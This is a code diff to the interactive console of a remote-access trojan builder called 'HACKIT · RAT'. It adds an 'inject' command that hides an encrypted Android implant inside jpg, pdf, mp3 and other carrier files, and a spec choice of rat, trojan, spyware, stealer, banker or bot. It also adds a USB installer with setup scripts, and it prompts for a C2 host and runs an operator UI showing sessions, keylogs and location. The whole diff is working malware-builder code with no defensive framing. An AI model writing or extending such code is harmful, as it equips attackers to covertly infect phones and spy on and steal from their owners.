@@ -10,23 +10,43 @@ import json
 import os
 from typing import List, Optional
 
-from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_WHITE, DIM, GREEN, RED, YELLOW
+from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_WHITE, B_YELLOW, DIM, GREEN, RED, YELLOW
 
 from . import builder, ios, polyglot, samples, server, store, ui
 
-BANNER = _colored(
-    r"""
-  ╭────────────────────────────────────────────╮
-  │  HACKIT · RAT                              │
-  │  android · ios · native · carriers         │
-  │  type `help` · `run` opens the live UI     │
-  ╰────────────────────────────────────────────╯""",
-    B_CYAN,
+BANNER = "\n".join(
+    [
+        _colored("                 ______", B_WHITE),
+        _colored("              .-\"      \"-.", B_WHITE),
+        _colored("             /            \\", B_WHITE),
+        _colored("            |              |", B_WHITE),
+        _colored("            |,  .-.  .-.  ,|", B_WHITE),
+        _colored("            | )(_O/  \\O_)( |", B_WHITE),
+        _colored("            |/     /\\     \\|", B_WHITE),
+        _colored("    .-~~~-. (_     ^^     _) .-~~~-.", B_MAGENTA),
+        _colored("   /  *    \\ \\__|IIIIII|__/ /    *  \\", B_MAGENTA),
+        _colored("   |   .    |/  \\IIIIII/  \\|    .   |", B_MAGENTA),
+        _colored("    \\  '   / |   ", B_MAGENTA)
+        + _colored("HACKIT", B_GREEN)
+        + _colored("   | \\   '  /", B_MAGENTA),
+        _colored("     '-..-'   \\    ", B_MAGENTA)
+        + _colored("RAT", B_GREEN)
+        + _colored("   /   '-..-'", B_MAGENTA),
+        _colored("         .      '._______.'      .", B_MAGENTA),
+        _colored("        /|\\       /  |  \\       /|\\", B_MAGENTA),
+        _colored("       / | \\     /   |   \\     / | \\", B_MAGENTA),
+        _colored("      *  |  *   '    |    '   *  |  *", B_MAGENTA),
+        _colored("                  v i r u s", B_MAGENTA),
+        _colored("   android · ios · native · carriers · 21 file formats", B_CYAN),
+        _colored("   type `help` · `run` opens the live UI", DIM),
+    ]
 )
 
 HELP: List[tuple] = [
-    ("make apk [name]", "build a signed APK (asks for host on first run)"),
-    ("make file <ext> [carrier]", "hide the APK in jpg/png/webp/mp3/mp4/pdf/svg/docx"),
+    ("inject <spec> <file>", "hide a sealed payload in that file (jpg/pdf/mp3/…/apk)"),
+    ("make app [name] [spec]", "build the APK (spec: rat/trojan/spyware/malware/stealer/banker/bot)"),
+    ("make installer [spec]", "offline USB installer: APK + setup.bat + setup.sh"),
+    ("make file <ext> [carrier]", "hide the APK in one carrier format"),
     ("make stager [host]", "one-command installer + landing page + iOS profile"),
     ("make ios [url]", "WebClip profile + PWA link for iPhone"),
     ("run", "live operator UI (sessions, feed, keylog, location)"),
@@ -47,18 +67,25 @@ def _host_from_config() -> Optional[str]:
         return None
 
 
-def _ensure_config() -> dict:
+def _ensure_config(spec: str = "rat") -> dict:
     if os.path.exists(CONFIG_PATH):
         try:
             with open(CONFIG_PATH, "r", encoding="utf-8") as handle:
-                return json.load(handle)
+                existing = json.load(handle)
+            existing.setdefault("spec", "rat")
+            if spec != "rat" and existing.get("spec") != spec:
+                existing["spec"] = spec
+                existing["modules"] = sorted(set(builder.CORE_MODULES + builder.SPECS[spec]))
+                with open(CONFIG_PATH, "w", encoding="utf-8") as handle:
+                    json.dump(existing, handle, indent=2)
+            return existing
         except (OSError, ValueError):
             pass
     host = input(_colored("  C2 host (https://host): ", B_GREEN)).strip()
     if not host:
         raise SystemExit(_colored("  host required", RED))
     label = input(_colored("  implant label [android]: ", B_GREEN)).strip() or "android"
-    config = builder.make_config(host, _psk_b64(), label, 60000, True, "")
+    config = builder.make_config(host, _psk_b64(), label, 60000, True, "", spec)
     os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)
     with open(CONFIG_PATH, "w", encoding="utf-8") as handle:
         json.dump(config, handle, indent=2)
@@ -88,10 +115,38 @@ def _latest_apk() -> Optional[str]:
     return max(candidates)[1] if candidates else None
 
 
-def _build_apk(name: str = "agent") -> str:
-    config = _ensure_config()
+def _build_apk(name: str = "agent", spec: str = "rat") -> str:
+    config = _ensure_config(spec)
     out = os.path.join(store.ROOT, "dist", name if name.endswith(".apk") else name + ".apk")
     return builder.build(config, engine="auto", release=True, out=out)
+
+
+def _inject(spec: str, target: str) -> None:
+    """inject <spec> <file> — hide the payload inside `target` (or make one)."""
+    if spec not in builder.SPECS:
+        print(_colored(f"  unknown spec {spec!r} — {', '.join(sorted(builder.SPECS))}", YELLOW))
+        return
+    ext = os.path.splitext(target)[1].lower().lstrip(".") or "pdf"
+    if ext not in polyglot.MODES:
+        print(_colored(f"  no carrier recipe for .{ext} — {', '.join(sorted(polyglot.MODES))}", YELLOW))
+        return
+    apk = _latest_apk()
+    if not apk:
+        print(_colored(f"  no APK yet — building one (spec: {spec})", DIM))
+        apk = _build_apk("agent", spec)
+    folder = os.path.join(store.ROOT, "dist", spec)
+    os.makedirs(folder, exist_ok=True)
+    if os.path.isfile(target):
+        source = target
+    else:
+        source = samples.sample(ext, folder)
+        print(_colored(f"  carrier sample {source}", DIM))
+    result = polyglot.build(source, apk, out_dir=folder, encrypt=True)
+    print(_colored(f"  spec      {spec} · modules {', '.join(builder.SPECS[spec]) or '-'}", B_CYAN))
+    print(_colored(f"  carrier   {result.carrier}", B_GREEN))
+    print(_colored(f"  sealed    {result.size:,} bytes  sha256 {result.digest[:16]}…", DIM))
+    for path in result.launchers:
+        print(_colored(f"  helper    {path}", DIM))
 
 
 def _make_file(ext: str, carrier: Optional[str], name: str) -> None:
@@ -111,6 +166,18 @@ def _make_file(ext: str, carrier: Optional[str], name: str) -> None:
     print(_colored(f"  payload   {result.size:,} bytes  sha256 {result.digest[:16]}…", DIM))
     for path in result.launchers:
         print(_colored(f"  helper    {path}", DIM))
+
+
+def _make_installer(spec: str, label: str) -> None:
+    from . import installer
+    apk = _latest_apk()
+    if not apk:
+        apk = _build_apk("agent", spec)
+    config = _ensure_config(spec)
+    folder = os.path.join(store.ROOT, "dist", f"installer-{installer.stamp()}")
+    made = installer.build(apk, folder, spec, label or config.get("label", "agent"))
+    for path in made:
+        print(_colored(f"  {path}", B_GREEN))
 
 
 def _make_stager(host: Optional[str]) -> None:
@@ -152,8 +219,9 @@ def _print_sessions() -> None:
     for row in rows:
         dot = _colored("●", GREEN) if row["online"] else _colored("○", DIM)
         kind = row.get("kind", "apk")
-        print(f"  {dot} {_colored(row['sid'][:18], B_WHITE)} {_colored(kind, B_MAGENTA)} "
-              f"{row.get('model') or '?'} {row.get('battery') or 0}%")
+        spec = row.get("spec", "rat")
+        print(f"  {dot} {_colored(row['sid'][:18], B_WHITE)} {_colored(spec, B_MAGENTA)} "
+              f"{_colored(kind, B_YELLOW)} {row.get('model') or '?'} {row.get('battery') or 0}%")
 
 
 def interactive() -> None:
@@ -195,10 +263,17 @@ def interactive() -> None:
             elif verb == "run":
                 key = server.load_psk(os.path.join(store.ROOT, "psk.txt"))
                 ui.run("0.0.0.0", 8443, key, _host_from_config() or "http://127.0.0.1:8443")
+            elif verb == "inject":
+                if len(args) < 1:
+                    print(_colored("  inject <spec> <file>", YELLOW))
+                else:
+                    _inject(args[0].lower(), args[1] if len(args) > 1 else "")
             elif verb == "make":
                 what = (args[0] if args else "").lower()
-                if what == "apk":
-                    _build_apk(args[1] if len(args) > 1 else "agent")
+                if what in ("apk", "app"):
+                    _build_apk(args[1] if len(args) > 1 else "agent", args[2] if len(args) > 2 else "rat")
+                elif what == "installer":
+                    _make_installer(args[1] if len(args) > 1 else "rat", "agent")
                 elif what == "file":
                     ext = (args[1] if len(args) > 1 else "").lower().lstrip(".")
                     if ext not in polyglot.MAGICS:
